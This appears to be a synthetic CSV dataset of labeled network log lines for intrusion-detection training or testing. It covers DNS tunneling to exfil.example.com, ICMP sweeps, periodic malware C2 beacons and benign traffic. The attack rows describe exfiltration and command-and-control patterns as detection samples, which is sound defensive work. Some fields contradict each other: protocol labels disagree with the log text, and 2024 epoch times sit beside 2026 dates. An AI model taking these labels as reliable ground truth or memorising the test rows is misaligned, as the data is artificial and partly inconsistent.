id,attack_type,protocol,log_example,expected_label
SNORT-P1-0130,dns_tunneling,tcp,"2026-05-25T14:09:18Z zeek_dns uid=DNS009 id.orig_h=10.40.0.29 id.resp_h=8.8.4.4 proto=TCP query=""iot-state-report-09.segment2.data.exfil.example.com"" qtype_name=TXT len=87 warning=""dns tunneling suspicion""",malicious
SNORT-P1-0131,dns_tunneling,dns,1716812010.44 DNS mailseed-fragment-10.segment3.data.exfil.example.com qtype=TXT src=10.40.1.30 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
SNORT-P1-0132,dns_tunneling,udp,"2026-05-25T14:11:18Z zeek_dns uid=DNS011 id.orig_h=10.40.2.31 id.resp_h=8.8.4.4 proto=UDP query=""prodconfig-xfer-11.segment4.data.exfil.example.com"" qtype_name=TXT len=89 warning=""dns tunneling suspicion""",malicious
SNORT-P1-0133,dns_tunneling,dns,1716812012.44 DNS staging-build-tag-12.segment1.data.exfil.example.com qtype=TXT src=10.40.0.32 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
SNORT-P1-0134,dns_tunneling,udp,"2026-05-25T14:13:18Z zeek_dns uid=DNS013 id.orig_h=10.40.1.33 id.resp_h=8.8.4.4 proto=UDP query=""dnswrap-session-13.segment2.data.exfil.example.com"" qtype_name=TXT len=91 warning=""dns tunneling suspicion""",malicious
SNORT-P1-0135,dns_tunneling,tcp,1716812014.44 DNS inventory-slice-14.segment3.data.exfil.example.com qtype=TXT src=10.40.2.34 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
SNORT-P1-0136,dns_tunneling,dns,"2026-05-25T14:15:18Z zeek_dns uid=DNS015 id.orig_h=10.40.0.35 id.resp_h=8.8.4.4 proto=DNS query=""metrics-rollup-15.segment4.data.exfil.example.com"" qtype_name=TXT len=93 warning=""dns tunneling suspicion""",malicious
SNORT-P1-0137,dns_tunneling,udp,1716812016.44 DNS policy-pack-blob-16.segment1.data.exfil.example.com qtype=TXT src=10.40.1.36 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
SNORT-P1-0138,dns_tunneling,dns,"2026-05-25T14:17:18Z zeek_dns uid=DNS017 id.orig_h=10.40.2.37 id.resp_h=8.8.4.4 proto=DNS query=""clientcache-segment-17.segment2.data.exfil.example.com"" qtype_name=TXT len=95 warning=""dns tunneling suspicion""",malicious
SNORT-P1-0139,dns_tunneling,udp,1716812018.44 DNS opsdiag-record-18.segment3.data.exfil.example.com qtype=TXT src=10.40.0.38 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
SNORT-P1-0140,dns_tunneling,tcp,"2026-05-25T14:19:18Z zeek_dns uid=DNS019 id.orig_h=10.40.1.39 id.resp_h=8.8.4.4 proto=TCP query=""telemetry-bundle-19.segment4.data.exfil.example.com"" qtype_name=TXT len=97 warning=""dns tunneling suspicion""",malicious
SNORT-P1-0141,icmp_sweep,icmp,2026-05-25T15:00:09Z icmp sweep src=198.51.100.140 targets=10.0.0.10-10.0.0.25 type=echo-request count=8 note=multiple hosts in 5s,malicious
SNORT-P1-0142,icmp_sweep,icmp,1716818001.77 ICMP_SCAN src=198.51.100.141 dst_range=10.0.1.5-10.0.1.24 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
SNORT-P1-0143,icmp_sweep,icmp,2026-05-25T15:02:09Z icmp sweep src=198.51.100.142 targets=10.2.4.10-10.2.4.30 type=echo-request count=10 note=multiple hosts in 5s,malicious
SNORT-P1-0144,icmp_sweep,icmp,1716818003.77 ICMP_SCAN src=198.51.100.143 dst_range=172.16.1.10-172.16.1.18 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
SNORT-P1-0145,icmp_sweep,icmp,2026-05-25T15:04:09Z icmp sweep src=198.51.100.144 targets=172.16.8.20-172.16.8.42 type=echo-request count=12 note=multiple hosts in 5s,malicious
SNORT-P1-0146,icmp_sweep,icmp,1716818005.77 ICMP_SCAN src=198.51.100.145 dst_range=192.168.1.1-192.168.1.20 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
SNORT-P1-0147,icmp_sweep,icmp,2026-05-25T15:06:09Z icmp sweep src=198.51.100.146 targets=192.168.10.10-192.168.10.40 type=echo-request count=9 note=multiple hosts in 5s,malicious
SNORT-P1-0148,icmp_sweep,icmp,1716818007.77 ICMP_SCAN src=198.51.100.147 dst_range=192.168.50.2-192.168.50.12 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
SNORT-P1-0149,icmp_sweep,icmp,2026-05-25T15:08:09Z icmp sweep src=198.51.100.148 targets=10.8.0.10-10.8.0.19 type=echo-request count=11 note=multiple hosts in 5s,malicious
SNORT-P1-0150,icmp_sweep,icmp,1716818009.77 ICMP_SCAN src=198.51.100.149 dst_range=10.9.3.4-10.9.3.21 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
SNORT-P1-0151,icmp_sweep,icmp,2026-05-25T15:10:09Z icmp sweep src=198.51.100.150 targets=172.20.5.10-172.20.5.22 type=echo-request count=8 note=multiple hosts in 5s,malicious
SNORT-P1-0152,icmp_sweep,icmp,1716818011.77 ICMP_SCAN src=198.51.100.151 dst_range=172.20.6.10-172.20.6.24 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
SNORT-P1-0153,icmp_sweep,icmp,2026-05-25T15:12:09Z icmp sweep src=198.51.100.152 targets=192.168.77.7-192.168.77.27 type=echo-request count=10 note=multiple hosts in 5s,malicious
SNORT-P1-0154,icmp_sweep,icmp,1716818013.77 ICMP_SCAN src=198.51.100.153 dst_range=10.3.6.11-10.3.6.26 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
SNORT-P1-0155,icmp_sweep,icmp,2026-05-25T15:14:09Z icmp sweep src=198.51.100.154 targets=10.4.7.15-10.4.7.35 type=echo-request count=12 note=multiple hosts in 5s,malicious
SNORT-P1-0156,icmp_sweep,icmp,1716818015.77 ICMP_SCAN src=198.51.100.155 dst_range=172.18.9.10-172.18.9.29 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
SNORT-P1-0157,icmp_sweep,icmp,2026-05-25T15:16:09Z icmp sweep src=198.51.100.156 targets=10.7.2.9-10.7.2.15 type=echo-request count=9 note=multiple hosts in 5s,malicious
SNORT-P1-0158,icmp_sweep,icmp,1716818017.77 ICMP_SCAN src=198.51.100.157 dst_range=192.168.200.1-192.168.200.18 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
SNORT-P1-0159,icmp_sweep,icmp,2026-05-25T15:18:09Z icmp sweep src=198.51.100.158 targets=10.10.10.10-10.10.10.28 type=echo-request count=11 note=multiple hosts in 5s,malicious
SNORT-P1-0160,icmp_sweep,icmp,1716818019.77 ICMP_SCAN src=198.51.100.159 dst_range=172.31.0.3-172.31.0.19 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
SNORT-P1-0161,malware_c2,https,"2026-05-25T16:00:31Z proxy src=10.50.0.10 dst=203.0.113.200 proto=HTTPS uri=""/beacon"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0162,malware_c2,http,"10.50.0.11 - - [25/May/2026:16:01:31 +0000] ""POST /gate.php HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0163,malware_c2,tcp,"2026-05-25T16:02:31Z proxy src=10.50.0.12 dst=203.0.113.202 proto=TCP uri=""/sync/api"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0164,malware_c2,dns,"2026-05-25T16:03:31Z zeek_dns uid=C2003 id.orig_h=10.50.0.13 id.resp_h=203.0.113.200 query=""cmd.3.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
SNORT-P1-0165,malware_c2,https,"2026-05-25T16:04:31Z proxy src=10.50.0.14 dst=203.0.113.204 proto=HTTPS uri=""/cdn/status"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0166,malware_c2,https,"10.50.0.15 - - [25/May/2026:16:05:31 +0000] ""POST /tasks/poll HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0167,malware_c2,http,"2026-05-25T16:06:31Z proxy src=10.50.0.16 dst=203.0.113.206 proto=HTTP uri=""/metrics/push"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0168,malware_c2,tcp,"10.50.0.17 - - [25/May/2026:16:07:31 +0000] ""POST /healthz HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0169,malware_c2,dns,"2026-05-25T16:08:31Z zeek_dns uid=C2008 id.orig_h=10.50.0.18 id.resp_h=203.0.113.200 query=""cmd.8.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
SNORT-P1-0170,malware_c2,https,"10.50.0.19 - - [25/May/2026:16:09:31 +0000] ""POST /edge/ping HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0171,malware_c2,https,"2026-05-25T16:10:31Z proxy src=10.50.0.20 dst=203.0.113.210 proto=HTTPS uri=""/news.png"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0172,malware_c2,http,"10.50.0.21 - - [25/May/2026:16:11:31 +0000] ""POST /api/v2/ping HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0173,malware_c2,tcp,"2026-05-25T16:12:31Z proxy src=10.50.0.22 dst=203.0.113.212 proto=TCP uri=""/fonts/css"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0174,malware_c2,dns,"2026-05-25T16:13:31Z zeek_dns uid=C2013 id.orig_h=10.50.0.23 id.resp_h=203.0.113.200 query=""cmd.13.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
SNORT-P1-0175,malware_c2,https,"2026-05-25T16:14:31Z proxy src=10.50.0.24 dst=203.0.113.214 proto=HTTPS uri=""/alive"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0176,malware_c2,https,"10.50.0.25 - - [25/May/2026:16:15:31 +0000] ""POST /image/check HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0177,malware_c2,http,"2026-05-25T16:16:31Z proxy src=10.50.0.26 dst=203.0.113.216 proto=HTTP uri=""/service/status"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
SNORT-P1-0178,malware_c2,tcp,"10.50.0.27 - - [25/May/2026:16:17:31 +0000] ""POST /device/pulse HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0179,malware_c2,dns,"2026-05-25T16:18:31Z zeek_dns uid=C2018 id.orig_h=10.50.0.28 id.resp_h=203.0.113.200 query=""cmd.18.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
SNORT-P1-0180,malware_c2,https,"10.50.0.29 - - [25/May/2026:16:19:31 +0000] ""POST /ajax/gif HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
SNORT-P1-0181,benign_traffic,http,2026-05-25T17:00:11Z access src=10.60.0.10 dst=10.70.0.20 proto=HTTP dpt=443 note=Normal user browsing corporate portal over HTTPS with regular GET /home and static CSS requests status=200 category=benign,benign
SNORT-P1-0182,benign_traffic,https,2026-05-25T17:01:11Z access src=10.60.0.11 dst=10.70.0.21 proto=HTTPS dpt=443 note=CI/CD health check calling /readyz every 30 seconds from the build agent status=200 category=benign,benign
SNORT-P1-0183,benign_traffic,dns,"2026-05-25T17:02:11Z dns_normal src=10.60.0.12 dst=10.70.0.53 query=""service2.internal.example.com"" qtype=A note=Monitoring probe resolving api.internal.example.com and db.internal.example.com benign=true",benign
SNORT-P1-0184,benign_traffic,tcp,2026-05-25T17:03:11Z network event src=10.60.0.13 dst=10.70.0.23 proto=TCP dpt=22 note=Backup system connecting once per night to the storage bastion with successful SSH auth outcome=success benign traffic,benign
SNORT-P1-0185,benign_traffic,icmp,2026-05-25T17:04:11Z icmp health src=10.60.0.14 dst=10.70.0.1 type=echo-request count=1 note=Network monitoring sending one ICMP echo request every 60 seconds to the router benign monitoring,benign
SNORT-P1-0186,benign_traffic,http,2026-05-25T17:05:11Z access src=10.60.0.15 dst=10.70.0.25 proto=HTTP dpt=80 note=Search engine crawler fetching the public documentation pages at a low rate status=200 category=benign,benign
SNORT-P1-0187,benign_traffic,https,2026-05-25T17:06:11Z access src=10.60.0.16 dst=10.70.0.26 proto=HTTPS dpt=443 note=Developer staging payload upload for a legitimate release artifact status=200 category=benign,benign
SNORT-P1-0188,benign_traffic,dns,"2026-05-25T17:07:11Z dns_normal src=10.60.0.17 dst=10.70.0.53 query=""service7.internal.example.com"" qtype=A note=Legitimate long DNS TXT record for SPF and DKIM validation benign=true",benign
SNORT-P1-0189,benign_traffic,tcp,2026-05-25T17:08:11Z network event src=10.60.0.18 dst=10.70.0.28 proto=TCP dpt=443 note=CDN edge reconnecting to the origin after a cache refresh outcome=success benign traffic,benign
SNORT-P1-0190,benign_traffic,http,2026-05-25T17:09:11Z access src=10.60.0.19 dst=10.70.0.29 proto=HTTP dpt=8080 note=Internal admin testing of a diagnostics page without exploit markers status=200 category=benign,benign
SNORT-P1-0191,benign_traffic,https,2026-05-25T17:10:11Z access src=10.60.0.20 dst=10.70.0.30 proto=HTTPS dpt=443 note=Payroll application session refresh from a managed workstation status=200 category=benign,benign
SNORT-P1-0192,benign_traffic,dns,"2026-05-25T17:11:11Z dns_normal src=10.60.0.21 dst=10.70.0.53 query=""service11.internal.example.com"" qtype=A note=Automated certificate validation using an ACME DNS challenge benign=true",benign
SNORT-P1-0193,benign_traffic,tcp,2026-05-25T17:12:11Z network event src=10.60.0.22 dst=10.70.0.32 proto=TCP dpt=8443 note=Asset inventory scanner collecting TLS banner metadata on approved hosts outcome=success benign traffic,benign
SNORT-P1-0194,benign_traffic,http,2026-05-25T17:13:11Z access src=10.60.0.23 dst=10.70.0.33 proto=HTTP dpt=80 note=Public status page checked by uptime monitor with HEAD /status status=200 category=benign,benign
SNORT-P1-0195,benign_traffic,https,2026-05-25T17:14:11Z access src=10.60.0.24 dst=10.70.0.34 proto=HTTPS dpt=443 note=SaaS webhook delivery retry after a temporary timeout status=200 category=benign,benign
SNORT-P1-0196,benign_traffic,dns,"2026-05-25T17:15:11Z dns_normal src=10.60.0.25 dst=10.70.0.53 query=""service15.internal.example.com"" qtype=A note=Container platform resolving service names inside the cluster benign=true",benign
SNORT-P1-0197,benign_traffic,tcp,2026-05-25T17:16:11Z network event src=10.60.0.26 dst=10.70.0.36 proto=TCP dpt=25 note=Mail relay sending queued notification messages to the SMTP gateway outcome=success benign traffic,benign
SNORT-P1-0198,benign_traffic,http,2026-05-25T17:17:11Z access src=10.60.0.27 dst=10.70.0.37 proto=HTTP dpt=8080 note=QA team browsing a demo environment with harmless query parameters status=200 category=benign,benign
SNORT-P1-0199,benign_traffic,icmp,2026-05-25T17:18:11Z icmp health src=10.60.0.28 dst=10.70.0.1 type=echo-request count=1 note=Single ICMP echo request from the NOC dashboard after packet loss alert benign monitoring,benign
SNORT-P1-0200,benign_traffic,https,2026-05-25T17:19:11Z access src=10.60.0.29 dst=10.70.0.39 proto=HTTPS dpt=443 note=Finance report download from the internal portal with valid session cookies status=200 category=benign,benign
